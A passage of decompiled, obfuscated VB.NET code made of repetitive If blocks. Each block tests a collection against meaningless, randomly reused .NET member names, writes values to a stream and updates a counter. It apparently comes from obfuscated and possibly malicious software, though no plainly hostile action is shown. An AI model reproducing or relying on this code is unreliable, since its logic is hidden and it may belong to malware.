                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.set_UnmanagedCode())) Then
                    streamWriter.WriteLine(isImplicit.ListControl())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.set_Opacity())) Then
                    streamWriter.WriteLine(isImplicit.SectionInformation)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.AddRefAccessor())) Then
                    streamWriter.WriteLine(isImplicit.SqlAeadAes256CbcHmac256EncryptionKey())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.ControlEventArgs())) Then
                    streamWriter.WriteLine(isImplicit.TextBoxRenderer())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.d__50())) Then
                    streamWriter.WriteLine(isImplicit.Precision)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.onerror())) Then
                    streamWriter.WriteLine(isImplicit.RaftingContainerGradientBegin)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.SyncRoot)) Then
                    streamWriter.WriteLine(isImplicit.SetWindowText())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.StringComparison())) Then
                    streamWriter.WriteLine(isImplicit.DSA())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.OnWindowUnload())) Then
                    streamWriter.WriteLine(isImplicit.Interfaces)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.GetMemberLookupResults())) Then
                    streamWriter.WriteLine(isImplicit.add_CurrentChanged())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.RevokeObjectBound())) Then
                    streamWriter.WriteLine(isImplicit.RestrictionFacets())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.ConvertManagedToNative())) Then
                    streamWriter.WriteLine(isImplicit.add_DownloadStringCompleted())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.SetKeySize())) Then
                    streamWriter.WriteLine(isImplicit.TypeExists())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.add_EnabledChanged())) Then
                    streamWriter.WriteLine(isImplicit.GetCookieEnabled())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.Nested)) Then
                    streamWriter.WriteLine(isImplicit.PushValue())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.TargetVersion)) Then
                    streamWriter.WriteLine(isImplicit.set_PathSeparator())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.LicFileLicense())) Then
                    streamWriter.WriteLine(isImplicit.remove_GiveFeedback())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.IsAlive)) Then
                    streamWriter.WriteLine(isImplicit.EXPRFLAG())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.PseudoCustomAttribute())) Then
                    streamWriter.WriteLine(isImplicit.LayoutEventArgs())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.ITypeInfo())) Then
                    streamWriter.WriteLine(isImplicit.onpage())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.Italic)) Then
                    streamWriter.WriteLine(isImplicit.set_HasGet())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.ControlBindingsCollection())) Then
                    streamWriter.WriteLine(isImplicit.set_ProhibitDefaultResolverString())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.ListContiguousIndexRangeEnumerator())) Then
                    streamWriter.WriteLine(isImplicit.AsParallel())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.ProxyAuthenticate)) Then
                    streamWriter.WriteLine(isImplicit.XmlMappingAccess())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.AddWeeks())) Then
                    streamWriter.WriteLine(isImplicit.CreateCells())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.ReadOnlyObservableCollection())) Then
                    streamWriter.WriteLine(isImplicit.Day())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.ParamDefs)) Then
                    streamWriter.WriteLine(isImplicit.DeclAdded())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.OleDbParameterCollection())) Then
                    streamWriter.WriteLine(isImplicit.set_NumberDecimalSeparator())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.DataTextWriter())) Then
                    streamWriter.WriteLine(isImplicit.remove_ColumnContextMenuStripChanged())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.OldDesigner)) Then
                    streamWriter.WriteLine(isImplicit.CMS_FILE_FLAG())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.LockInPlaceActive())) Then
                    streamWriter.WriteLine(isImplicit.OnInPlaceActivate())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.GetColumnWidths())) Then
                    streamWriter.WriteLine(isImplicit.InternalPrimitiveTypeE())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.ConvertFirst())) Then
                    streamWriter.WriteLine(isImplicit.HebrewToken())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.set_KeyChar())) Then
                    streamWriter.WriteLine(isImplicit.c__DisplayClass32_0())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.SwitchLevelType)) Then
                    streamWriter.WriteLine(isImplicit.CreateIconPICTDESC())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.HttpRequestException())) Then
                    streamWriter.WriteLine(isImplicit.add_NewWindow())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.ParentURL)) Then
                    streamWriter.WriteLine(isImplicit.set_ScopeId())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.DispatchMessage())) Then
                    streamWriter.WriteLine(isImplicit.PolicyLevel())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.TypedDynamicExpression2())) Then
                    streamWriter.WriteLine(isImplicit.IHTMLElementCollection())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.ToGenericVar())) Then
                    streamWriter.WriteLine(isImplicit.Play())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.CompareAssemblyLocale)) Then
                    streamWriter.WriteLine(isImplicit.Compile())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.SetClientGuid())) Then
                    streamWriter.WriteLine(isImplicit.isLvalue())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.MuiResourceTypeIdStringEntry())) Then
                    streamWriter.WriteLine(isImplicit.DarkSeaGreen)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.AddNewNotAllowNull())) Then
                    streamWriter.WriteLine(isImplicit.Win32NativeMethods())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.GetSecurityDescriptorSddlForm())) Then
                    streamWriter.WriteLine(isImplicit.set_HelpForeColor())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.GetPropInfo())) Then
                    streamWriter.WriteLine(isImplicit.GlobalizationAssembly())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.AttributeGroups)) Then
                    streamWriter.WriteLine(isImplicit.ArgumentException())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.MDEmitter())) Then
                    streamWriter.WriteLine(isImplicit.SetClass())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.SurrogateSelector)) Then
                    streamWriter.WriteLine(isImplicit.NOTIFYICONDATA())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.IsValidLanguageIndependentIdentifier())) Then
                    streamWriter.WriteLine(isImplicit.CodeDomProvider())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.set_FieldNames())) Then
                    streamWriter.WriteLine(isImplicit.DtQName)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.FirstOrDefault())) Then
                    streamWriter.WriteLine(isImplicit.StorePermissionAttribute())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.CngKeyCreationOptions())) Then
                    streamWriter.WriteLine(isImplicit.IsNillable)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.ExportParameters())) Then
                    streamWriter.WriteLine(isImplicit.AggregateType())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.SetBorderBottomWidth())) Then
                    streamWriter.WriteLine(isImplicit.AsymmetricKeyExchangeFormatter())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.SqlClientPermission())) Then
                    streamWriter.WriteLine(isImplicit.remove_UpDown())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.set_HasNotNullableValueTypeConstraint())) Then
                    streamWriter.WriteLine(isImplicit.ICONINFO())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.CSTRMarshaler())) Then
                    streamWriter.WriteLine(isImplicit.RespectReadonly())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.set_Matrix11())) Then
                    streamWriter.WriteLine(isImplicit.FollowingQuery())
                    Me.EndOf.PlatformID(Me.set_Select)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.DeploymentProviderCodebase)) Then
                    streamWriter.WriteLine(isImplicit.IsolatedStoragePermission())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.remove_Load())) Then
                    streamWriter.WriteLine(isImplicit.set_RowHeadersDefaultCellStyle())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.set_Inherited())) Then
                    streamWriter.WriteLine(isImplicit.onchange_void())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.set_Uri())) Then
                    streamWriter.WriteLine(isImplicit.GetValueNames())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.CodeSnippetCompileUnit())) Then
                    streamWriter.WriteLine(isImplicit.AddName())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.PoolBlockingPeriod())) Then
                    streamWriter.WriteLine(isImplicit.ShowDropDownArrow)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.FrameworkName)) Then
                    streamWriter.WriteLine(isImplicit.GetManagedEntryPoint())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.UserDetach())) Then
                    streamWriter.WriteLine(isImplicit.c__DisplayClass228_2())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.RemoveAccessRuleAll())) Then
                    streamWriter.WriteLine(isImplicit.BitHelper())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.SpecifiedSize)) Then
                    streamWriter.WriteLine(isImplicit.HelpEventHandler())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.GetLineHeight())) Then
                    streamWriter.WriteLine(isImplicit.InternalNameSpaceE())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.AssemblyResolveException())) Then
                    streamWriter.WriteLine(isImplicit.AdviseHelper())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.ImageKeyConverter())) Then
                    streamWriter.WriteLine(isImplicit.OpenThemeData())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.CacheEntryFlags())) Then
                    streamWriter.WriteLine(isImplicit.Block3())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.SoapIgnoreAttribute())) Then
                    streamWriter.WriteLine(isImplicit.CurrentTab)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.FromAsyncTrimPromise())) Then
                    streamWriter.WriteLine(isImplicit.DataGridViewComboBoxDisplayStyle())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.set_TodayDate())) Then
                    streamWriter.WriteLine(isImplicit.LinkAreaConverter())
                    Me.EndOf.get_DataView(Me.set_Select)
                    num = 1001
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.TableLayoutPanelGrowStyle())) Then
                    streamWriter.WriteLine(isImplicit.SortOrdinal)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.RawStandAloneSigRow())) Then
                    streamWriter.WriteLine(isImplicit.OffsetLow)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.set_PasswordInClearText())) Then
                    streamWriter.WriteLine(isImplicit.set_LastDisplayedScrollingRow())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.ListManagerBindingsCollection())) Then
                    streamWriter.WriteLine(isImplicit.ToolStripDropDown())
                    num = num + 1
                    Me.EndOf.SafeFileHandle(Me.set_Select)
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.DSSPUBKEY())) Then
                    streamWriter.WriteLine(isImplicit.BlockN())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.SetBorderRight())) Then
                    streamWriter.WriteLine(isImplicit.set_Parity())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.CurrentPrincipal)) Then
                    streamWriter.WriteLine(isImplicit.PopulateDefaultValues())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.ErrorType())) Then
                    streamWriter.WriteLine(isImplicit.Maximum)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.Thread32Next())) Then
                    streamWriter.WriteLine(isImplicit.CacheAxisQuery())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.Critical)) Then
                    streamWriter.WriteLine(isImplicit.SetItalic())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.LoadPolicyLevelFromString())) Then
                    streamWriter.WriteLine(isImplicit.RowComparer())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.GetActivationContextData())) Then
                    streamWriter.WriteLine(isImplicit.EntitySendFormat())
                    num = 1001
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.Hour)) Then
                    streamWriter.WriteLine(isImplicit.set_ProxyRevalidate())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.TextEncodedRawTextWriter())) Then
                    streamWriter.WriteLine(isImplicit.ISupportInitializeNotification())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.set_InstanceId())) Then
                    streamWriter.WriteLine(isImplicit.ApplicationBasePath())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.PaleGreen)) Then
                    streamWriter.WriteLine(isImplicit.WindowsGraphicsWrapper())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.ItemBoundsPortion())) Then
                    streamWriter.WriteLine(isImplicit.add_LinkHoverColorChanged())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.OverlappedData())) Then
                    streamWriter.WriteLine(isImplicit.remove_BalloonTipClicked())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.AssemblyQualifiedName)) Then
                    streamWriter.WriteLine(isImplicit.IPv4InterfaceProperties())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.MeasureItemEventArgs())) Then
                    streamWriter.WriteLine(isImplicit.ReceiverType)
                    num = 1001
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.ListItem)) Then
                    streamWriter.WriteLine(isImplicit.BestFitMapping)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.FieldWithType())) Then
                    streamWriter.WriteLine(isImplicit.GetConsequence())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.RemoveCommand())) Then
                    streamWriter.WriteLine(isImplicit.WriteToServerAsync())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.AppContext())) Then
                    streamWriter.WriteLine(isImplicit.RawFieldRow())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.AuthenticateAsClientAsync())) Then
                    streamWriter.WriteLine(isImplicit.HelpVisible)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.OnMenuBar())) Then
                    streamWriter.WriteLine(isImplicit.WebSocketMessageType())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.Modifier)) Then
                    streamWriter.WriteLine(isImplicit.AsDate)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.ValidForPointer())) Then
                    streamWriter.WriteLine(isImplicit.Intern())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.InterfaceImplementationMethodSymbol())) Then
                    streamWriter.WriteLine(isImplicit.ArrayWithOffset())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.remove_InputLanguageChanging())) Then
                    streamWriter.WriteLine(isImplicit.DrawRightHorizontalTrack())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.State())) Then
                    streamWriter.WriteLine(isImplicit.IsIPv6LinkLocal)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.CurrentTimeZone)) Then
                    streamWriter.WriteLine(isImplicit.HelpEventHandler())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.add_AlternatingBackColorChanged())) Then
                    streamWriter.WriteLine(isImplicit.TextElementEnumerator())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.CreateCounterSetInstance())) Then
                    streamWriter.WriteLine(isImplicit.set_SelfAffectingProcessMgmt())
                    Me.EndOf.get_Schema(Me.set_Select)
                    num = 1001
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.MakeBinary())) Then
                    streamWriter.WriteLine(isImplicit.ModifierKeys)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.TabScopes)) Then
                    streamWriter.WriteLine(isImplicit.Keys)
                    Me.EndOf.get_ReturnXmlElementName(Me.set_Select)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.CategoryNameCollection())) Then
                    streamWriter.WriteLine(isImplicit.ValueMethod())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.SetRemoveOnMethod())) Then
                    streamWriter.WriteLine(isImplicit.ResourceSetType)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.DeviceContextTextAlignment())) Then
                    streamWriter.WriteLine(isImplicit.remove_Focusing())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.ReaderWriterLockTimedOutException())) Then
                    streamWriter.WriteLine(isImplicit.MoveToNextNamespace())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.RegisterClipboardFormat())) Then
                    streamWriter.WriteLine(isImplicit.UncheckedNormal)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.FullScreen)) Then
                    streamWriter.WriteLine(isImplicit.CharStorage())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.MoveToPosition())) Then
                    streamWriter.WriteLine(isImplicit.remove_Collapse())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.set_MinimumPage())) Then
                    streamWriter.WriteLine(isImplicit.NamespaceHandling)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.set_EnableSsl())) Then
                    streamWriter.WriteLine(isImplicit.FeatureExtension())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.RecursionPolicy)) Then
                    streamWriter.WriteLine(isImplicit.DataGridViewRowHeadersWidthSizeMode())
                    Me.EndOf.get_Families(Me.set_Select)
                    num = 1001
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.MemberBind())) Then
                    streamWriter.WriteLine(isImplicit.CurrentThread)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.EnumeratorType())) Then
                    streamWriter.WriteLine(isImplicit.NodeType)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.RelationAlreadyInOtherDataSet())) Then
                    streamWriter.WriteLine(isImplicit.LoadCursor())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.TransactionContext)) Then
                    streamWriter.WriteLine(isImplicit.set_RawValue())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.GetLogNames())) Then
                    streamWriter.WriteLine(isImplicit.RevertPermitOnly())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.DarkSlateGray)) Then
                    streamWriter.WriteLine(isImplicit.SortedListKeyEnumerator())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.StruckOut)) Then
                    streamWriter.WriteLine(isImplicit.ReadChar())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.XsdKatmaiDateTimeOffsetToString())) Then
                    streamWriter.WriteLine(isImplicit.UriKind())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.CompatibilityFlag())) Then
                    streamWriter.WriteLine(isImplicit.OdbcDescriptorHandle())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.X509ExtensionCollection())) Then
                    streamWriter.WriteLine(isImplicit.remove_Deselected())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.GetIconInfo())) Then
                    streamWriter.WriteLine(isImplicit.GetInteropFieldTypeAndNameFromXmlElement())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.XmlLang)) Then
                    streamWriter.WriteLine(isImplicit.EffectiveDescription)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.remove_RenderToolStripContentPanelBackground())) Then
                    streamWriter.WriteLine(isImplicit.SaveObject())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.Sign())) Then
                    streamWriter.WriteLine(isImplicit.CreateDeprecatedConfigContext())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.ObjectCreationDelegate())) Then
                    streamWriter.WriteLine(isImplicit.GetStoryCount())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.BeginInvoke())) Then
                    streamWriter.WriteLine(isImplicit.EnumUnresolvedMethods())
                    Me.EndOf.RichTextBoxLanguageOptions(Me.set_Select)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.SetTop())) Then
                    streamWriter.WriteLine(isImplicit.FontSmoothingContrast)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.PerformanceCounterPermission())) Then
                    streamWriter.WriteLine(isImplicit.set_TextFormat())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.PrimaryMonitorMaximizedWindowSize)) Then
                    streamWriter.WriteLine(isImplicit.ClassInterfaceType())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.TraceOptions())) Then
                    streamWriter.WriteLine(isImplicit.CodePropertyReferenceExpression())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.d__1b())) Then
                    streamWriter.WriteLine(isImplicit.Shield)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.ThreadTransferSend())) Then
                    streamWriter.WriteLine(isImplicit.BlueViolet)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.set_Start())) Then
                    streamWriter.WriteLine(isImplicit.PeekBit())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.RegistryRights)) Then
                    streamWriter.WriteLine(isImplicit.set_AllowWebBrowserDrop())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.AllowVectorFonts)) Then
                    streamWriter.WriteLine(isImplicit.DataFeed())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.IsClear)) Then
                    streamWriter.WriteLine(isImplicit.MintCream)
                    Me.EndOf.get_StringsHeap(Me.set_Select)
                    num = 1001
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.TypedDynamicExpression4())) Then
                    streamWriter.WriteLine(isImplicit.AllFiles)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.CurrencyManager)) Then
                    streamWriter.WriteLine(isImplicit.DefaultThreadCurrentCulture)
                    Me.EndOf.set_UnescapedXml()
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.QueryPerformanceCounter())) Then
                    streamWriter.WriteLine(isImplicit.DataGridViewAutoSizeColumnsModeEventHandler())
                    Me.EndOf.MetafileType(Me.set_Select)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.add_ContextMenuChanged())) Then
                    streamWriter.WriteLine(isImplicit.RC2CryptoServiceProvider())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.ChangeDatabase())) Then
                    streamWriter.WriteLine(isImplicit.IsStruct)
                    Me.EndOf.HashHelpers(Me.set_Select)
                    num = 1001
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.GetSchemas())) Then
                    streamWriter.WriteLine(isImplicit.Install)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.AsNamespace())) Then
                    streamWriter.WriteLine(isImplicit.set_DataSetName())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.add_ColumnToolTipTextChanged())) Then
                    streamWriter.WriteLine(isImplicit.ServerFault())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.ItemDragEventArgs())) Then
                    streamWriter.WriteLine(isImplicit.ActiveXImpl())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.HasCurrent)) Then
                    streamWriter.WriteLine(isImplicit.IProgIdRedirectionEntry())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.OnWindows2003)) Then
                    streamWriter.WriteLine(isImplicit.WaitListItem())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.DGCaptionPaint)) Then
                    streamWriter.WriteLine(isImplicit.remove_CellPaint())
                    num = num + 1
                End If
